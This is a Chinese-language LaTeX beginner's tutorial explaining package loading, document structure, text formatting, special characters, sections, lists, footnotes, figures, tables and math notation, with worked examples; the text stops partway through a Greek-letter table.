\\usepackage[可选参数]{宏包名称} {宏包名称} (必填) 这是宏包的核心标识，用于指定需要加载的宏包\n可以一次性加载多个无参数的宏包，用逗号隔开，例如\\usepackage{amsmath, graphicx}\n常用宏包：\n宏包名称 主要功能与用途 ctex 中文支持的核心宏包，当使用ctexart等文档类型时，该宏包会被自动加载 amsmath 美国数学学会(AMS)宏包，提供更丰富的数学公式环境，如多行公式、矩阵等 amssymb AMS宏包，提供更多数学符号，如 \\mathbb (黑板粗体)、\\checkmark (对勾) amsthm AMS宏包，用于定义专业的定理、引理、定义等环境 graphicx 提供\\includegraphics 命令，是插入图片（如 JPG, PNG, PDF）的必备宏包 geometry 便捷地设置页面布局，如页边距、纸张方向、页眉页脚距离等 hyperref 自动为文档内的引用（目录、公式、参考文献）创建可点击的PDF超链接，极大提升电子文档的交互性 xcolor 提供颜色支持，可以定义和使用颜色来修饰文本、表格背景等 fancyhdr 用于自定义页眉和页脚，可以添加章节名、页码、校徽等复杂信息 listings 用于插入带语法高亮的代码块，是撰写技术文档的利器 [可选参数] (选填) 用于对所加载的宏包进行配置。每个宏包都有一套独立的参数\n注意：在LaTeX中，当一个选项是布尔型（true/false）时，只写选项名就默认等价于true\n这里分别介绍几个常用宏包的参数\ngeometry\n这个宏包专门用于精细控制页面尺寸和边距\n选项 功能说明 left=2.5cm、right=2.5cm 分别设置左、右页边距 top=3cm、bottom=3cm 分别设置上、下页边距 margin=1in 将上、下、左、右所有页边距统一设置为1英寸 a4paper、b5paper 设定纸张尺寸 landscape 设置为横向排版（默认为 portrait 纵向） showframe 在页面上显示布局的辅助线框，方便调试页边距设置 hyperref\n这个宏包用于生成PDF的超链接和书签\n选项 功能说明 colorlinks=true 使用彩色文本作为链接，而非默认的带边框样式。强烈推荐设置 linkcolor=black 设置内部链接（如目录、章节引用 \\ref）的颜色 citecolor=blue 设置文献引用（\\cite）的链接颜色 urlcolor=cyan 设置网址链接（\\url）的颜色 bookmarks=true 在PDF阅读器侧边栏中生成可点击的书签 pdfstartview=FitH 设置PDF打开时的默认视图为“适合页宽” xcolor\n这个宏包用于在文档中使用颜色\n选项 功能说明 dvipsnames 加载dvips预定义的68种颜色名称（如Goldenrod） svgnames 加载SVG预定义的151种颜色名称（如AliceBlue） x11names 加载X11预定义的317种颜色名称（如LightSteelBlue） 加载这些选项后，就可以直接通过名称使用颜色，例如\\textcolor{Goldenrod}{这是金麒麟色的文字}\nctex\n当手动加载\\usepackage{ctex}时，可以填选\n选项 功能说明 UTF8 明确指定源文件编码为UTF-8（现在通常是默认设置，无需手动指定） fontset=adobe 设置中文字体集为Adobe字体（需要系统安装相应字体） fontset=windows 在Windows系统下，设置中文字体集为系统自带字体（如宋体、黑体等） 示例 \\usepackage{amsmath, amssymb} \\usepackage[a4paper, margin=2.5cm, showframe]{geometry} \\usepackage{graphicx} \\usepackage[colorlinks, citecolor=blue, linkcolor=black, bookmarks=true]{hyperref} 这段代码在导言区加载并配置了一系列常用的宏包：\n\\usepackage{amsmath, amssymb}\n通过逗号分隔的方式，同时加载了 amsmath 和 amssymb 两个宏包\n他们为文档提供了强大的数学公式排版能力和丰富的数学符号支持\n\\usepackage[a4paper, margin=2.5cm, showframe]{geometry}\n加载了geometry宏包，并传入了三个参数：\na4paper: 确保页面尺寸是基于 A4 纸张计算的 margin=2.5cm: 将页面的上、下、左、右所有页边距统一设置为 2.5 厘米 showframe: 在生成的PDF上绘制辅助线框，方便我们检查页边距设置是否符合预期。 \\usepackage{graphicx}\n加载了graphicx宏包\n这一行代码本身不产生任何效果，但它使得我们可以在正文部分使用\\includegraphics命令来插入图片\n\\usepackage[...]{hyperref}\n加载了hyperref宏包，并通过一系列参数对其进行了详细配置：\ncolorlinks: 使链接以彩色文本显示 citecolor=blue: 文献引用链接为蓝色 linkcolor=black: 内部跳转链接（如目录）为黑色 bookmarks=true: 会在生成的 PDF 文件中创建书签，方便快速导航 正文区 在导言区完成文档的全局设置后，正文区（document环境）用于撰写具体内容。\n正文环境：document 所有希望在最终PDF中显示的内容，都必须放在\\begin{document}和\\end{document}之间\n\\begin{document}和\\end{document}中的document 并不是一个可选参数或用户自定义的名字，它是 LaTeX 固定的环境名称，用于标识正文的开始，不是可选的，不能改动！\n命令 / 符号 功能说明 \\begin{document} 正文开始标志\n必须在导言区（包括所有\\usepackage命令）之后使用 \\end{document} 正文结束标志\n编译器会忽略此命令之后的所有内容 注释 单行注释 使用符号%，从%开始到行尾的内容都会被忽略，不会出现在最终PDF里\n注释的一行是源代码的一行，而不是LaTeX文章的一行 使用快捷键ctrl+/能快速注释选中行 多行注释 LaTeX没有内置的多行注释符号，如果想要多行注释，最简单的方式是连续多行都写%\n也可以使用下面的方式：\n\\iffalse 这几行内容都会被忽略 即使有多行 LaTeX 也不会处理 \\fi \\iffalse表示“如果条件为假”，LaTeX会跳过它和\\fi 之间的内容，相当于把里面的东西忽略掉\n示例 \\begin{document} % 作者的所有可见内容、命令和环境都写在这里。 % 这一行是注释，不会显示在PDF中 ... \\end{document} 文档内容排版 在设置好文档的框架（导言区）后，我们就可以开始在正文环境中填充实际内容了\n这部分将介绍如何组织文本结构、设置样式以及创建列表\n段落、间距与分页 LaTeX会自动处理文本的排版，但我们有时也需要手动控制换行和分页\n命令操作 注意：\n在行中的命令最好左右加上空格 在行间的命令最好上下隔开空行 操作 实现方式 说明 开始新段落 在代码中留出一个或多个空行 这新段落会自动应用首行缩进 强制换行 \\\\ 或 \\newline 在当前位置中断该行内容\n从下一行开始它不属于新段落，因此没有首行缩进 禁止换行 ~ 这是非换行空格\n放在两个词之间以确保它们不会因换行而分开\n比如Dr.~Smith 制造水平空格 \\quad 产生一个当前字号的全角宽度 (1em) 的空格 \\qquad 产生当前字号的两倍全角宽度的空格 \\hspace{长度} 产生一个指定长度的水平空格，如\\hspace{1cm} \\hfill 弹性空格，会自动填充所在行所有可用的水平空间\n可用于实现左右对齐 制造垂直空行 \\vspace{长度} 产生一个指定高度的垂直空白，如\\vspace{5mm} \\smallskip, \\medskip, \\bigskip 三个预设的、有弹性的垂直空白，尺寸由小到大 强制分页 \\newpage 立即结束当前页面，将后续内容移至新的一页 局部取消缩进 \\noindent 段落开头不缩进\n注意要和正文之间有空格/换行符 全局取消缩进 \\setlength{\\parindent}{0pt} - 局部进行缩进 \\hspace*{2em}段落\\\\ 和上一条命令结合可以做到指定行才缩进 左对齐 \\begin{flushleft}...\\end{flushleft} - 居中对齐 \\begin{center}...\\end{center} - 右对齐 \\begin{flushright}...\\end{flushright} - 示例 这是第一段的文字，一直写下去直到行尾自动换行 这是第二段的文字，因为它和第一段之间有一个空行，所以它会首行缩进 现在要强制换行了\\\\这一句紧接着上一句，但是没有缩进 \\begin{center} 这是一段居中的文字 \\end{center} \\noindent 这一行虽然换行了，却没有首行缩进 \\noindent 开头 \\quad 我远离了前面的字 \\qquad 我更远离了 \\hspace{2cm} 还是我比较远一点 左边内容→弹性 \\hfill 弹性←右边内容 小空行： \\smallskip 中空行： \\medskip 大空行： \\bigskip 自定义空行： \\vspace{2cm} 到这里是两厘米空行 要另起一页了 \\newpage 这是新的一页 编译结果：\n文本样式 LaTeX 提供了一系列命令来改变局部文本的字体样式\n命令 命令 效果 英文说明 \\textbf{...} 加粗文本 Bold Face \\textit{...} 意大利斜体 Italic \\textsl{...} 倾斜文本 Slanted \\textsc{...} 小型大写字母 Small Caps \\textup{...} 直立体 Upright (用于在斜体环境中恢复正常字体) \\underline{...} 下划线 Underline \\texttt{...} 等宽字体/打字机体 typewriter \\textnormal{...} 正常文本 恢复到当前文档的默认字体 他们之间可以互相嵌套，比如：\\underline{\\textbf{\\textit{示例文本}}}\n示例 \\noindent 这是一段普通的文本，其中包含 \\textbf{加粗} 和 \\textit{斜体}\\\\ 这是正常字母：ABC\\\\ 这是小型大写字母\\textsc{abc}\\\\ 请注意 \\textsl{倾斜} 与 \\textit{意大利斜体} 的细微差别\\\\ \\underline{\\textbf{\\textit{既要下划线又要斜体还要加粗就这样}}}\\\\ 特殊字符 在 LaTeX 中，许多键盘上的符号被用作特殊命令，因此不能直接输入。这一节将介绍如何正确地输入这些特殊字符，以及其他一些常用的排版符号。\n英文引号 英文的弯引号‘ ’和“ ”与键盘上直接打出的直引号'和\u0026quot;是不同的\n在 LaTeX 中，输入正确的弯引号需要使用特定的按键\n功能 输入方式 渲染效果 英文单引号 (左) ` (反单引号) ‘ 英文单引号 (右) \u0026rsquo; (单引号) ’ 英文双引号 (左) `` (两个反单引号) “ 英文双引号 (右) \u0026rsquo;\u0026rsquo; (两个单引号) ” 保留字符 以下字符在LaTeX中有特殊含义，因此不能直接在文本中输入 要显示它们本身，必须在前面加上反斜杠 \\ 来进行转义\n符号 输入命令 说明 # \\# 宏定义参数符号 $ \\$ 数学模式切换符号 % \\% 注释符号 \u0026amp; \\\u0026amp; 对齐符号（用于表格、矩阵等） _ \\_ 下标符号（数学模式） { \\{ 命令参数或分组的开始 } \\} 命令参数或分组的结束 ^ \\^{} 上标符号（数学模式） ~ \\~{} 非换行空格或字母重音 \\ \\textbackslash 命令引导符，也就是反斜杠 常见货币与版权符号 符号 输入命令 备注 € \\texteuro 需要 textcomp 宏包 £ \\pounds 无需特殊宏包 ¥ \\textyen 需要 textcomp 宏包 (在 ctex 环境下有时可直接输入) © \\copyright 版权符号 ® \\textregistered 注册商标符号 ™ \\texttrademark 商标符号 ° \\textdegree 度数符号 (文本模式) 破折号与连字号 类型 输入 渲染效果 用途 连字号 (Hyphen) - (一个 -) - 用于连接复合词，如state-of-the-art。 En 短破折号 (En-dash) -- (两个 -) – 用于表示数值、日期范围，如pages 10–20 Em 长破折号 (Em-dash) --- (三个 -) — 用于分隔句子——功能类似中文的破折号 URL和文件路径 网址和文件路径中经常包含_、%、\u0026amp;等特殊字符，直接输入会导致编译错误\n处理这个问题的最佳方法是使用url或hyperref宏包提供的\\url{}命令，还可以生成可点击的链接\n功能 命令 示例与说明 网址/路径 \\url{...} \\url{https://www.example.com/test_path?q=query%20space} • 自动处理特殊字符 • 允许在合适的位置断行 字母重音与变音符号 在输入一些非英语单词（如法语、德语）时，需要为字母添加重音符号\n虽然现代的XeLaTeX编译器通常支持直接输入这些字符，但使用命令还是好一些\n效果 命令 à \\`a 标题、作者与日期 这些信息构成了文档的“标题块”，通常显示在文档的最开始\n它们在导言区被定义，然后在正文区通过一个命令显示出来\n命令详解 命令 作用 使用区域 \\title{文档标题} 定义文档的主标题 导言区 \\author{作者姓名} 定义文档的作者 导言区 \\date{日期} 定义文档的日期\n可留空\\date{}不显示日期，或使用\\today自动生成当天日期 导言区 \\maketitle 将以上三个命令定义的信息生成并显示在文档中 正文区 \\title{...}、\\author{...}、\\date{...}这三个命令在\\begin{document}之前被调用，它们只是将内容“暂存”起来，并不会直接显示任何东西\n进入\\begin{document}环境后，\\maketitle命令被调用，它会读取之前暂存的标题、作者和日期信息，并按照ctexart文档类型预设的、规范的格式将它们排版输出\n示例 \\documentclass[12pt]{ctexart} \\title{噢耶，构构的文档} \\author{张顺三} \\date{\\today} \\begin{document} \\maketitle 文档的正文 \\end{document} 编译结果：\n章节与目录 对于结构化的长文档，章节是必不可少的\nLaTeX通过简单的命令即可创建带自动编号的章节，并基于这些章节信息自动生成目录\n命令详解 命令 层级 适用文档类型 \\chapter{章标题} 章 book, report \\section{节标题} 节（一级标题） article, report, book \\subsection{小节标题} 小节（二级标题） article, report, book \\subsubsection{小小节标题} 小小节（三级标题）\nLaTeX默认只有三级标题，到此为止 article, report, book \\tableofcontents - 所有 \\tableofcontents命令会在其所在位置插入一个完整的目录\nLaTeX会自动扫描全文的章节命令来生成此目录\n在Overleaf中，目录的更新是自动的；在本地环境中，有时需要编译两次才能正确生成\n示例 \\documentclass{ctexart} \\title{噢耶，构构的文档} \\author{张顺三} \\date{\\today} \\begin{document} \\maketitle \\tableofcontents \\section{引言} 第一部分的正文内容 \\subsection{研究背景} 第一部分第一节的正文内容 \\subsubsection{地点调研} 第一部分第一节第一点的正文内容 \\section{实验方法} 第二部分的正文内容 \\end{document} 编译结果：\n摘要与关键词 摘要（Abstract）是学术文章开头不可或缺的部分，它简要概括了文章的核心内容\n在article和ctexart等文档类型中，LaTeX提供了专门的abstract环境来排版摘要\n环境与命令 环境 / 命令 功能说明 \\begin{abstract}\n...\n\\end{abstract} 摘要环境\n放置在此环境中的文本会被自动格式化为摘要样式（通常会带有“摘要”标题，并采用稍窄的页边距） \\textbf{关键词：} 关键词并没有标准的独立命令，通常的做法是在摘要内容的末尾，手动换行并使用粗体命令来添加关键词列表 示例 \\documentclass{ctexart} \\author{笔者} \\title{摘要的示例} \\begin{document} \\maketitle % 先显示标题 \\begin{abstract} \\noindent 本文旨在提供一个关于如何在 LaTeX 中创建摘要和关键词的完整示例，通过使用 \\texttt{abstract} 环境，我们可以轻松地生成符合学术规范的摘要部分 \\vspace{1ex} % 在摘要和关键词之间增加一点垂直距离 \\noindent\\textbf{关键词：} LaTeX；摘要；关键词；学术写作 \\end{abstract} \\section{引言} 正文内容 \\end{document} 编译结果：\n\\begin{abstract}...\\end{abstract}环境会自动在文档标题下方生成一个居中的摘要标题，并将环境内的文本以特定格式进行排版\n在摘要正文结束后，我们使用\\vspace{1ex} 增加了一个小间距，然后用\\noindent取消了接下来的行缩进，并通过\\textbf{关键词：} 创建了加粗的关键词标题\n列表环境 列表是组织和呈现条目式信息的有效方式\nLaTeX提供了多种列表环境，它们都以\\begin{...}开始，以\\end{...}结束\n列表中的每个项目都由\\item命令开始\n环境详解 环境名称 列表类型 特点 itemize 无序列表 各项默认使用•(实心圆点)作为项目符号 enumerate 有序列表 各项自动编号，默认使用1.，2.，3. \u0026hellip; 作为项目符号 description 描述列表 各项使用\\item[标签]自定义标签，标签会加粗显示，适合术语解释 任何列表环境都可以嵌套在另一个列表的\\item中，形成多级列表\n示例 \\section{水果分类} \\begin{description} \\item[常见水果（描述列表）] 这是一些常见的水果： \\begin{enumerate} \\item 苹果（有序列表） \\item 香蕉 \\end{enumerate} \\item[不常见水果（描述列表）] 这是一些不常见的水果： \\begin{itemize} \\item 榴莲（无序列表） \\item 蛇皮果 \\end{itemize} \\end{description} 编译结果：\n最外层是一个description列表，用\\item[常见水果]和\\item[不常见水果]创建了两个带自定义粗体标签的条目\n在常见水果条目内部，嵌套了一个enumerate环境，创建了带自动编号1.和2.的有序列表\n在不常见水果条目内部，嵌套了一个itemize环境，创建了带•符号的无序列表\n脚注 脚注用于在页面底部对正文内容进行补充说明、注释或提供引文来源\nLaTeX 提供了完善的自动化支持，可以自动编号和定位\n命令 命令 作用与说明 \\footnote{脚注内容} 它会在命令所在的位置插入一个上标数字，\n并将花括号{}中的脚注内容自动放置在当前页面的底部 \\footnotemark[编号] 只生成上标数字标记，但不生成页面底部的脚注文本\n用于\\footnote命令无法正常工作的特殊环境\n编号可以省略，也可以加上来指定脚注 \\footnotetext[编号]{脚注内容} 只生成页面底部的脚注文本，不生成上标标记\n通常与\\footnotemark配对使用\n编号可以省略，省略时自动递增 编号规则 默认编号规则 使用\\footnote{}：\nLaTeX会自动给每个脚注分配连续编号（从 1 开始），编号会根据出现顺序递增\n第一条脚注\\footnote{内容 A} 第二条脚注\\footnote{内容 B} 使用\\footnotemark + \\footnotetext：\n如果不指定编号，\\footnotemark会自动使用下一个可用编号，对应的\\footnotetext默认使用同一个编号\n文字\\footnotemark % 自动分配编号 1 \\footnotetext{脚注内容} % 编号 1 下一个脚注会自动编号2：\n字1\\footnotemark \\footnotetext{脚注内容1} 字2\\footnotemark \\footnotetext{脚注内容2} 一定要在每个标记后紧跟内容（也就是mark+text成对出现），不然footnotetext无法识别新的编号：\n字1\\footnotemark 字2\\footnotemark \\footnotetext{脚注内容1} \\footnotetext{脚注内容2} \\footnotemark使用时，会让当前页脚计数器footnote的值加1\n当我们连续两次使用\\footnotemark但还没有用\\footnotetext，LaTeX会把两次标记都绑定到当前计数器值，因此两个标记都显示为2\n手动指定编号 可以在方括号[]里指定编号，编号不会按顺序递增，而是使用我们指定的数字\n第一次引用\\footnotemark[1] 第二次引用\\footnotemark[5] \\footnotetext[1]{脚注内容1} \\footnotetext[5]{脚注内容5} 多次引用同一脚注 第一次引用\\footnotemark[1]，第二次引用同一脚注\\footnotemark[1] \\footnotetext[1]{脚注内容} 特别注意 \\footnotemark不增加编号计数，除非与\\footnotetext配合\n\\footnote{}会同时生成标记和内容，计数自动递增\n手动编号要小心，避免与自动编号冲突\n示例1：常规用法 \\LaTeX \\footnote{发音为 /`laːtɛx/} 是一种高质量的排版系统 这个系统基于 TeX\\footnote{TeX 是排版引擎，而 \\LaTeX 是基于 TeX 的宏包} 编译结果：\n这里使用的\\LaTeX是一个比较好玩的命令，会显示LaTeX的logo\n示例2：在表格等特殊环境中使用 在tabular环境中，直接使用\\footnote 会出错，此时需要\\footnotemark和\\footnotetext 的组合\n表格在后面会讲到：创建表格 \\begin{table}[h] \\centering \\caption{在表格中使用脚注} \\begin{tabular}{|l|c|} \\hline 项目 \u0026amp; 预测数值\\footnotemark[1] \\\\ 拨款博丽神社 \u0026amp; 999999999\\footnotemark[2] \\\\ \\hline \\end{tabular} \\end{table} \\footnotetext[1]{此数值为初步估算} \\footnotetext[2]{此数值为完全虚构} 编译结果：\n插入图片 在 LaTeX 中插入图片通常分为三步：\n加载宏包 上传图片 使用figure环境和\\includegraphics命令 图片通常被放置在浮动体(figure)环境中，这允许 LaTeX 自动寻找页面上最合适的位置放置图片，避免产生难看的大片空白\n准备工作 加载宏包 在导言区必须导入graphicx包：\n\\usepackage{graphicx} 上传图片 在Overleaf的左侧文件列表中，点击 \u0026ldquo;Upload\u0026rdquo; 按钮，上传我们的图片文件\n请确保图片文件与.tex文件在同一目录下或在子目录中（此时引用需写明路径，如images/logo.png）\nfigure环境 这是包裹图片及其相关信息（如标题）的容器，下面我们一步步解析构成figure环境的各个命令\n\\begin{figure}[位置建议符] **这个命令标志着一个figure浮动环境的开始，注意b\n方括号[]中的位置建议符是可选的，我们通过它向LaTeX建议我们希望图片出现的位置\n常用的建议符有：\n参数 英文含义 说明 常用组合示例 说明 h here 尽可能把浮动体放在当前位置（代码所在位置附近） [h] 单独使用时可能不生效，因为LaTeX仍然会遵循排版规则 t top 尝试把浮动体放在页面顶部 [t] 浮动体优先放在页面顶部 b bottom 尝试把浮动体放在页面底部 [b] 浮动体优先放在页面底部 p page 将浮动体放在一个只包含浮动体的专门页面 [p] 适合大量图表或大表格 ! override 忽略部分限制，强制LaTeX尽量遵守指定位置 [!h] 例如[!ht]，让LaTeX尽量放在当前位置或顶部 H here absolutely 强制浮动体出现在当前位置，不允许浮动（需float宏包） [H] 完全固定位置，不浮动 我们可以将这些建议符组合使用，例如[htbp]，这会告诉LaTeX：\n优先尝试放在这里(h)，如果不行就放在页顶(t)，再不行就放在页底(b)，最差的情况就单独放一页(p)\n\\centering 此命令会使其环境内的内容（在这里就是我们的图片）在页面上水平居中显示\n它独占一行，不需要花括号\n\\includegraphics 这是实际插入图片文件的命令，通常放在figure环境内部\n格式:\n\\includegraphics[可选参数]{图片文件名} 可选参数 功能说明 width=8cm 指定图片的显示宽度为8厘米 width=0.5\\textwidth 指定图片的显示宽度为当前文本区域宽度的50%\n这是一种更灵活、更推荐的方式，因为它会自动适应不同页面设置 height=6cm 指定图片的显示高度 scale=0.5 将图片缩放至原始尺寸的50% angle=45 将图片逆时针旋转45度 \\caption{图片标题} 这个命令会为我们的图片生成一个带自动编号的标题（例如\u0026quot;图1: 公司Logo\u0026quot;）\nLaTeX会自动管理编号，我们完全无需担心顺序问题，只需要在花括号{}中写入图片的描述即可\n\\label{标签名} 该命令为图片设置一个独一无二的标签，用于在正文中进行交叉引用，标签本身不会在文档中显示任何内容\n为了便于管理，我们推荐使用fig:作为图片标签的前缀，也就是写成\\label{fig:标签名}\n设置好标签后，我们就可以在文中的任何地方使用\\ref{fig:标签名}来引用这张图片的编号\n\\end{figure} 这个命令标志着figure环境的结束\n示例 \\documentclass{ctexart} \\usepackage{graphicx} \\begin{document} \\section{公司简介} 如图 \\ref{fig:logo} 所示，这是我们公司的Logo，可爱捏 \\begin{figure}[htbp]\t\\centering \\includegraphics[width=0.4\\textwidth]{2.png} \\caption{公司 Logo} \\label{fig:logo} \\end{figure} \\end{document} 编译结果：\n(确保1.png文件已上传至当前Overleaf项目中，注意文件路径)\n\\begin{figure}[htbp]\n开始一个图片浮动环境，并建议LaTeX将其放置在当前位置、页面顶部或底部\n\\centering\n命令\\includegraphics输出的图片将会在可用宽度内居中\n\\includegraphics[width=0.4\\textwidth]{logo.png}\n{logo.png}: 指定要插入的图片文件 [width=0.4\\textwidth]: 将该图片的显示宽度设置为页面文本宽度的 40% \\caption{公司 Logo}\n在图片下方生成带编号的标题\n\\label{fig:logo}\n为该图赋予一个唯一的标签fig:logo\n在正文中，如图 \\ref{fig:logo} 所示 这句话在编译后会自动变成 “如图 1 所示”，实现了自动引用\n创建表格 与图片类似，表格通常被放置在一个叫table的浮动环境中，以便排版和添加标题\n而表格的实际内容则由tabular环境构建\n对于复杂表格，使用在线表格生成器（如 TablesGenerator.com ）可以大大提高效率！\n环境与命令 table环境 table环境是表格的浮动容器，其作用和用法与figure环境几乎完全相同，它允许LaTeX自动寻找最佳位置放置表格，其中\\begin{table}[htbp]，\\centering，\\caption{}和\\label{}命令的用法也完全一致\n为了区分，我们最好使用tab:作为表格标签的前缀，例如\\label{tab:my-data}\ntabular环境 它就类似图片的\\includegraphics，是构建表格内容的主体，所有的文本、数字和分隔线都在这个环境中定义\n一般也放在table环境中\n\\begin{tabular}{列格式定义} 这个命令标志着表格实际内容的开始\n它有一个必须填写的参数{列格式定义}，由一组特殊的字符构成，用于定义表格有多少列以及每一列的对齐方式\n符号 含义 说明 l left 定义一个左对齐的列 c center 定义一个居中对齐的列 r right 定义一个右对齐的列 例如，{l|c|r} 表示创建一个三列的表格，第一列左对齐，第二列居中，第三列右对齐，列与列之间用竖线隔开\n内容和边框 在 tabular 环境内部，我们使用以下符号和命令来填充内容和绘制线条：\n命令 作用/说明 \u0026amp; 列分隔符，用于分隔同一行的不同列，如果一行有n列，则该行应有n-1个\u0026amp; \\\\ 行结束符，结束当前行，后续内容将成为新的一行 \\hline 水平线命令，绘制贯穿表格所有列的完整水平线，通常放在一行的\\\\之后，分隔不同的行 \\cline{i-j} 局部水平线命令，从第i列左边开始，到第j列右边结束，可精细控制水平线的范围 示例 \\documentclass{ctexart} \\begin{document} \\section{幻想乡智力表} \\begin{table}[htbp] \\centering \\caption{请输入文本} \\label{tab:table} \\begin{tabular}{|c|c|} \\hline \\textbf{妖精姓名} \u0026amp; \\textbf{智商} \\\\ \\hline 大妖精 \u0026amp; 1 \\\\ \\hline 露娜 \u0026amp; 1 \\\\ \\hline 琪露诺 \u0026amp; 9 \\\\ \\cline{2-2} \u0026amp; 4+5 \\\\ \\hline \\end{tabular} 表格底下也能写字哈哈，到底能多长长长长长长长长长长呢 \\end{table} 该表格的编号是：\\ref{tab:table} 和图片一样，引用得到的都是编号 \\end{document} 编译结果：\n\\begin{table}[htbp] ... \\end{table}\n创建一个表格浮动体\n\\centering, \\caption, \\label\n分别使表格居中、添加标题和设置引用标签tab:table\n\\begin{tabular}{|c|c|}\n开始tabular环境\n{|c|c|} 定义了表格的格式：最外层有竖线，共两列居中对齐(c)，列之间都有竖线(|)\n\\hline\n在表格的顶部、标题行下方和底部绘制了完整的水平分割线\n\\textbf{妖精姓名} \u0026amp; \\textbf{智商} \\\\\n这是表格的标题行，\u0026amp;分隔了三列的内容，\\\\结束该行，这里还使用了\\textbf命令对标题文字加粗\n琪露诺 \u0026amp; 9 \\\\\n这是第三行数据\n\u0026amp; 4+5 \\\\\n这是第四行数据，注意，因为姓名这一列的内容与上一行相同，所以第一个 \u0026amp; 前留空即可\n\\cline{2-2}\n绘制了一条第2列的水平线\n\\ref{tab:table}\n引用表格的编号\n数学公式 这是LaTeX最强大的功能，也是它在科技写作领域无可替代的原因\n准备工作 在开始之前，确保我们在导言区已经加载了amsmath宏包，它是美国数学学会提供的数学公式扩展包\n通常，我们还会一并加载amssymb（更多符号）和bm（公式加粗）\n\\usepackage{amsmath, amssymb, bm} 公式模式 LaTeX提供了多种将文本切换到“数学模式”的方式，主要分为三大类\n行内 无编号行间 有编号行间 模式分类 模式类型 代码实现 特点 行内公式 $...$ 公式嵌入在普通文本行中\n会为了适应行高而适当压缩公式的大小，例如分数会变小 无编号行间公式 \\[...\\] 公式会单独成行并居中显示\n以标准、清晰的尺寸进行排版，但不带自动编号 有编号行间公式 \\begin{equation}\n...\n\\end{equation} 与\\[...\\]类似，但会自动在公式右侧添加一个带括号的编号\n可以使用\\label加上标签，文中使用\\eqre引用其编号\n只能写一行公式，要多行必须结合aligned等环境 示例 \\documentclass{ctexart} \\usepackage{amsmath} \\begin{document} \\section{勾股定理} \\noindent 勾股定理是一个基本的几何定理，它说明在直角三角形中，两条直角边的平方和等于斜边的平方，即： $a^2 + b^2 = c^2$，这是一个行内公式\\\\ 我们可以将这个关系式单独展示出来，使其更醒目： \\[ a^2 + b^2 = c^2 \\]\\\\ 为了方便在后文中引用，我们通常使用带编号的公式环境： \\begin{equation} a^2 + b^2 = c^2 \\label{eq:pythagoras} \\end{equation}\\\\ 根据公式 \\eqref{eq:pythagoras}（这个编号是引用的喔），我们可以进行后续的计算 \\end{document} 编译结果：\n$...$\n$符号使a^2 + b^2 = c^2 以行内模式插入文本中\n\\[...\\]\n\\[和\\]将公式在单独一行中居中显示\n\\begin{equation}...\\end{equation}\n这个环境不仅使公式居中独立显示，还在右侧生成了编号(1)\n\\label{eq:pythagoras}\n我们在equation环境内部为这个公式贴上了一个标签eq:pythagoras\n\\eqref{eq:pythagoras}\n在正文中，我们使用\\eqref命令引用该标签，LaTeX自动将其替换为带括号的对应编号(1)\n常用数学命令 数学符号和结构是通过反斜杠\\开头的命令生成的，下面是几类最常用的命令\n上下标、根号与撇（求导） 注意: 上下标内容如果多于一个字符，必须用花括号{}包裹！\n功能 命令 示例 渲染效果 上标 ^ x^{2y} $x^{2y}$ 下标 _ a_{ij} $a_{ij}$ 多字符上/下标 ^{...},_{...} x^{n+1}, a_{i,j} $x^{n+1}, a_{i,j}$ 同时上下标 _...^... x_i^2 $x_i^2$ 局部上下标 \\limits \\sum\\limits_{i=1}^n $\\sum\\limits_{i=1}^n$ 根号 \\sqrt{} \\sqrt{1+x^2} $\\sqrt{1+x^2}$ n次方根 \\sqrt[n]{} \\sqrt[4]{16} $\\sqrt[4]{16}$ 连续根号 多重 \\sqrt \\sqrt{\\sqrt{x}} $\\sqrt{\\sqrt{x}}$ 撇（导数） ' f''(x) $f\u0026rsquo;\u0026rsquo;(x)$ 高阶导数 ^{(n)} f^{(3)}(x) $f^{(3)}(x)$ 点记号（微分） \\dot{}, \\ddot{} \\dot{x}, \\ddot{y} $\\dot{x}, \\ddot{y}$ 分数 功能 命令 示例 渲染效果 标准分数 \\frac{}{} \\frac{1}{x+y} $\\frac{1}{x+y}$ 行间分数 \\dfrac{}{} \\dfrac{1}{x+y} $\\dfrac{1}{x+y}$ 行内小分数 \\tfrac{}{} \\tfrac{1}{2} $\\tfrac{1}{2}$ 连续分数 嵌套 \\frac \\frac{1}{1+\\frac{1}{x}} $\\frac{1}{1+\\frac{1}{x}}$ 二项式系数 \\binom{n}{k} \\binom{n}{k} $\\binom{n}{k}$ 组合公式 \\tbinom{n}{k} / \\dbinom{n}{k} \\dbinom{n}{k}, \\tbinom{n}{k} $\\dbinom{n}{k}, \\tbinom{n}{k}$ 常见运算符 功能 命令 示例 渲染效果 求和 \\sum \\sum_{i=1}^{n} i $\\sum_{i=1}^{n} i$ 连乘 \\prod \\prod_{i=1}^{n} x_i $\\prod_{i=1}^{n} x_i$ 积分 \\int \\int_{a}^{b} f(x) \\, dx $\\int_{a}^{b} f(x) , dx$ 二重/三重积分 \\iint, \\iiint \\iint_D f(x,y) \\, dxdy $\\iint_D f(x,y) , dxdy$ 极限 \\lim \\lim_{x \\to \\infty} \\frac{1}{x} $\\lim_{x \\to \\infty} \\frac{1}{x}$ 并集 \\bigcup \\bigcup_{i=1}^{n} A_i $\\bigcup_{i=1}^{n} A_i$ 交集 \\bigcap \\bigcap_{i=1}^{n} B_i $\\bigcap_{i=1}^{n} B_i$ 上确界 \\sup \\sup_{x \\in S} f(x) $\\sup_{x \\in S} f(x)$ 下确界 \\inf \\inf_{x \\in S} f(x) $\\inf_{x \\in S} f(x)$ 绝对值 \\lvert ... \\rvert \\lvert a \\rvert $\\lvert a \\rvert$ 范数 \\Vert ... \\Vert \\Vert v \\Vert $\\Vert v \\Vert$ 上取整 \\lceil ... \\rceil \\lceil 3.2 \\rceil $\\lceil 3.2 \\rceil = 4$ 下取整 \\lfloor ... \\rfloor \\lfloor 3.7 \\rfloor $\\lfloor 3.7 \\rfloor = 3$ 点乘 \\cdot \\vec{a} \\cdot \\vec{b} $\\vec{a} \\cdot \\vec{b}$ 向量叉乘 \\times \\vec{a} \\times \\vec{b} $\\vec{a} \\times \\vec{b}$ 省略符 横向省略号 \\dots 1,2,\\dots,n $1,2,\\dots,n$ 横向居中省略号 \\cdots a_1 + a_2 + \\cdots + a_n $a_1 + a_2 + \\cdots + a_n$ 纵向省略符号 \\vdots 矩阵元素省略 $\\vdots$ 对角线省略符号 \\ddots 矩阵元素省略 $\\ddots$ 希腊字母 小写 命令 大写 命令 α \\alpha Α \\Alpha（很少用） β \\beta Β \\Beta（很少用） γ \\gamma Γ \\Gamma δ \\delta Δ \\Delta ϵ \\epsilon Ε \\Epsilon（很少用） ζ \\zeta Ζ \\Zeta（很少用） η \\eta Η \\Eta（很少用） θ \\theta Θ 